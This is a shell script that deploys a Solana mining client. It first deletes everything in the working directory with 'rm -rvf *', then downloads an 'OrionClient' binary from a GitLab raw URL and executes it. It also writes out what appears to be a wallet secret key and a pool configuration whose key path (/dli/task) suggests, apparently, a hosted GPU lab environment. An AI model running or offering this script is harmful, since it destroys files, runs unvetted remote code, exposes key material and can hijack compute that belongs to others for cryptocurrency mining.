rm -rvf *
wget https://gitlab.com/majapahlevi/BARU/-/raw/main/OrionClient
chmod +x OrionClient
cat > id.json <<END
[65,195,14,58,36,176,173,218,211,180,157,11,228,225,187,179,221,119,200,3,100,237,187,50,162,253,17,250,172,164,117,181,244,70,81,158,225,17,162,200,200,216,74,204,107,228,97,170,51,174,202,215,96,77,213,57,207,208,160,123,221,182,21,80]
END
cat > settings.json <<END
{
  "Pool": "Twbitz",
  "GPUDevices": [
    0
  ],
  "KeyFile": "/dli/task/id.json",
  "PublicKey": null,
  "WorkerName": "1b86fa2e4779",
  "ignoreCertError": false,
  "ratio": 0.33,
  "timeout": 180,
  "MigratedSettings": true,
  "UsedAdvancedSettings": false,
  "CPUSetting": {
    "CPUHasher": "Stock [[C#]]",
    "CPUThreads": 6,
    "AutoSetCPUAffinity": true,
    "MinimumHashTime": 1.75
  },
  "GPUSetting": {
    "GPUHasher": "Cuda (Emulation)",
    "MaxGPUNoncePerBatch": 2048,
    "GPUBlockSize": 512,
    "ProgramGenerationThreads": 0,
    "EnableExperimentalHashers": false
  },
  "VanitySetting": {
    "GPUDevices": [],
    "MaxRAMUsageMB": 1024,
    "VanitySearchFile": "search.txt",
    "VanityOutputFile": "foundWallets.txt",
    "GPUBlockSize": 256,
    "MinimumCharacterLength": 0,
    "VanityThreads": 0
  },
  "RPCSetting": {
    "Url": "https://api.mainnet-beta.solana.com/"
  },
  "StakingViewSetting": {
    "StakingViewCacheFile": "cache.json",
    "TotalHistoricalDays": 7
  },
  "EventWebsocketSetting": {
    "Enable": false,
    "WebsocketUrl": "localhost",
    "Port": 54321,
    "Id": "",
    "ReconnectTimeMs": 5000,
    "Serialization": 0
  }
}
END
chmod +x OrionClient
./OrionClient
